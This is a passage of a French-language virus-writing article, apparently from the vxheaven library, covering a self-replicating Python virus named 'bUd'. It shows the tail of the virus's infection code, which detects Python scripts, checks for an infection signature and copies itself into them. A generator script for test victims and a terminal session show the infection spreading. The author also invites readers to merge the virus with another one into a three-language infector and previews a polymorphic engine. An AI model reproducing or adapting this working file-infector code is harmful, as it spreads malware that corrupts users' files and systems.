&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff7700;font-weight:bold;">if</span> pyt <span style="color: #66cc66;">==</span> <span style="color: #483d8b;">'#!/usr/bin/python<span style="color: #000099; font-weight: bold;">\n</span>'</span>: &nbsp; &nbsp; <span style="color: black; font-style: italic;">#teste si c'est du python</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; signature <span style="color: #66cc66;">=</span> hdl.<span style="color: #dc143c;">readline</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff7700;font-weight:bold;">if</span> signature <span style="color: #66cc66;">!=</span> <span style="color: #483d8b;">'#bUd<span style="color: #000099; font-weight: bold;">\n</span>'</span>: &nbsp; &nbsp;<span style="color: black; font-style: italic;">#test de signature</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl.<span style="color: black;">seek</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">0</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f<span style="color: #66cc66;">=</span>hdl.<span style="color: black;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl2<span style="color: #66cc66;">=</span><span style="color: #008000;">open</span><span style="color: black;">&#40;</span><span style="color: #dc143c;">sys</span>.<span style="color: black;">argv</span><span style="color: black;">&#91;</span><span style="color: #ff4500;">0</span><span style="color: black;">&#93;</span><span style="color: #66cc66;">,</span><span style="color: #483d8b;">'r'</span><span style="color: black;">&#41;</span><span style="color: black; font-style: italic;">#ouvre script courant</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl.<span style="color: black;">seek</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">0</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a<span style="color: #66cc66;">=</span><span style="color: #ff4500;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff7700;font-weight:bold;">while</span> a <span style="color: #66cc66;">!=</span> <span style="color: #ff4500;">30</span>: &nbsp; &nbsp; <span style="color: black; font-style: italic;">#boucle recopie ligne a ligne</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f2<span style="color: #66cc66;">=</span>hdl2.<span style="color: #dc143c;">readline</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl.<span style="color: black;">write</span><span style="color: black;">&#40;</span>f2<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a <span style="color: #66cc66;">=</span> a + <span style="color: #ff4500;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl2.<span style="color: black;">close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl.<span style="color: black;">close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl<span style="color: #66cc66;">=</span><span style="color: #008000;">open</span><span style="color: black;">&#40;</span><span style="color: #008000;">file</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'a'</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl.<span style="color: black;">write</span><span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">#recopie script original en suivant</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl.<span style="color: black;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff7700;font-weight:bold;">except</span>: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">#si on a échoué on passe au suivant</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff7700;font-weight:bold;">pass</span><br/>
&nbsp;</div>
<p>Ce virus non optimisé fait 536 octets, même en l'optimisant je ne pense pas que l'on puisse arriver à le faire aussi petit que son équivalent en Perl, et encore moins en bash.</p>
<p>Pour les tests je vais me faire un générateur de scripts cobaye: (Marre de faire ces scripts a la main :) )</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
<span style="color: #666666; font-style: italic;">#générateur de scripts cobaye</span><br/>
<span style="color: #666666; font-style: italic;">#./gen NomDesFichiers phraseAAfficher NombreDefichiersACrée</span><br/>
<span style="color: #007800;">x</span>=<span style="color: #000000;">1</span><br/>
<span style="color: #000000; font-weight: bold;">while</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$x</span> <span style="color: #660033;">-le</span> <span style="color: #007800;">$3</span> <span style="color: black;">&#93;</span><br/>
<span style="color: #000000; font-weight: bold;">do</span><br/>
<span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;#!/usr/bin/python&quot;</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$1</span><span style="color: #007800;">$x</span><br/>
<span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;print <span style="color: #000099; font-weight: bold;">\&quot;</span>$2<span style="color: #000099; font-weight: bold;">\&quot;</span>&quot;</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$1</span><span style="color: #007800;">$x</span><br/>
<span style="color: #c20cb9; font-weight: bold;">chmod</span> +x <span style="color: #007800;">$1</span><span style="color: #007800;">$x</span><br/>
<span style="color: #007800;">x</span>=<span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$x</span> + <span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">`</span><br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;</div>
<h2>Fonctionnement</h2>
<pre>
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ed88809d889fdd9fad818c9d99829d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$ ls
bUd*  gen*  vx/

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4e2b233e2b3c7e3c0e222f3e3a213e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> etudeioc5]$ ./gen cobaye je-suis-un-script-cobaye 6

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c3a6aeb3a6b1f3b183afa2b3b7acb3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$ ls
cobaye1*  cobaye2*  cobaye3*  cobaye4*  cobaye5*  cobaye6*  bUd*  gen*  vx/

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="67020a1702155715270b0617130817">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$ ./cobaye1
je-suis-un-script-cobaye

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6d08001d081f5d1f2d010c1d19021d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$
</pre>
<p>Le premier argument est le nom des fichiers crée, ensuite la phrase que le script cobaye peut afficher, puis le nombre de scripts a générer.</p>
<pre>
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ee8b839e8b9cde9cae828f9e9a819e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$ ls -al
total 44
drwxr-xr-x    3 emper0r  emper0r      4096 sep 11 16:00 ./
drwxr-xr-x    5 emper0r  emper0r      4096 sep 10 00:35 ../
-rwxr-xr-x    1 emper0r  emper0r        51 sep 11 16:00 cobaye1*
-rwxr-xr-x    1 emper0r  emper0r        51 sep 11 16:00 cobaye2*
-rwxr-xr-x    1 emper0r  emper0r        51 sep 11 16:00 cobaye3*
-rwxr-xr-x    1 emper0r  emper0r        51 sep 11 16:00 cobaye4*
-rwxr-xr-x    1 emper0r  emper0r        51 sep 11 16:00 cobaye5*
-rwxr-xr-x    1 emper0r  emper0r        51 sep 11 16:00 cobaye6*
-rwxr-xr-x    1 emper0r  emper0r       536 sep 11 15:47 bUd*
-rwxr-xr-x    1 emper0r  emper0r       133 sep 11 15:44 gen*
drwxr-xr-x    2 emper0r  emper0r      4096 sep 11 15:17 vx/

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="67020a1702155715270b0617130817">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$ chmod 000 cobaye1

[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="86e3ebf6e3f4b6f4c6eae7f6f2e9f6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$ ./bUd
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3c59514c594e0c4e7c505d4c48534c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> python]$ ls -al
total 44
drwxr-xr-x    3 emper0r  emper0r      4096 sep 11 16:00 ./
drwxr-xr-x    5 emper0r  emper0r      4096 sep 10 00:35 ../
----------    1 emper0r  emper0r        51 sep 11 16:00 cobaye1
-rwxr-xr-x    1 emper0r  emper0r       583 sep 11 16:01 cobaye2*
-rwxr-xr-x    1 emper0r  emper0r       583 sep 11 16:01 cobaye3*
-rwxr-xr-x    1 emper0r  emper0r       583 sep 11 16:01 cobaye4*
-rwxr-xr-x    1 emper0r  emper0r       583 sep 11 16:01 cobaye5*
-rwxr-xr-x    1 emper0r  emper0r       583 sep 11 16:01 cobaye6*
-rwxr-xr-x    1 emper0r  emper0r       536 sep 11 15:47 bUd*
-rwxr-xr-x    1 emper0r  emper0r       133 sep 11 15:44 gen*
drwxr-xr-x    2 emper0r  emper0r      4096 sep 11 15:17 vx/
</pre>
<p>Voila ça fonctionne ; le virus a infecté les scripts infectables, n'a pas touché aux autres et n'a pas généré de message d'erreur. Ces scripts infectés fonctionnent toujours et sont à leur tour capables d'infecter d'autre script python.</p>
<p>Maintenant pour ceux qui veulent s'amuser on peut ajouter cette souche, en la modifiant un peu, à mon virus h0egaard3n(voir IOC#4) pour faire une virus capable d'infecter 3 langages a la fois :)</p>
<h2>V. A venir</h2>
<p>Par manque de temps je n'ai pas pu inclure a cette article un moteur polymorphe, encours de réalisation, pour les virii perl. Pour ceux que ca interesse il sera normalement très prochainement dispo sur mon site (www.arbornet.org/~emper0r). J'ai aussi quelques idées pour améliorer ce moteur polymorphe et faire un petit métamorphique :)</p>
<pre>           &lt;&lt; May The Force Be With You... &gt;&gt;</pre>
[<a style="" href="/lib/?lang=FR&amp;index=MA#vem02">Back to index</a>] [<a href="/lib/vem02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vem02">de</a><a href="/lib/index.php?lang=en&amp;id=vem02">en</a><a href="/lib/index.php?lang=es&amp;id=vem02">es</a><a href="/lib/index.php?lang=it&amp;id=vem02">it</a><a href="/lib/index.php?lang=fr&amp;id=vem02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vem02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vem02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vem02">ua</a></div>
</body>
</html>
